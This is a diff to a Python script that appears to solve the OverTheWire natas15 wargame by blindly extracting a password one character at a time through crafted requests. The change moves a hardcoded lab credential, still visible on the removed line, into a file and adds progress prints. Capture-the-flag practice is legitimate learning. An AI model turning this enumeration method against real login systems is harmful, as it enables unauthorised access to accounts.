@@ -13,9 +13,16 @@ import requests as req
 from urllib import parse
 
 host = 'http://natas15.natas.labs.overthewire.org/index.php?username=natas16'
+with open('pass') as pwfile:
+    try:
+        pw = pwfile.readline()[:-1]
+    except Exception as e:
+        raise e
+
+print('starting...')
 
 session = req.Session()
-session.auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
+session.auth = ('natas15', pw)
 auth = session.post(host)
 
 def get_body(host: str, position: int, letter:str, sign: str = '>', upper: bool = False):
@@ -60,6 +67,7 @@ def a_dichotomic_search_for_a_lost_password_character(host: str, position: int, 
                 if (exists_in(get_body(host, position, str(i), '='))):
                     print(f"found position = {position} number = {str(i)}")
                     return str(i)
+            print("something is wrong... i can feel it")
             
     letter = chr((low_end + high_end) // 2)
     body = get_body(host, position, letter)
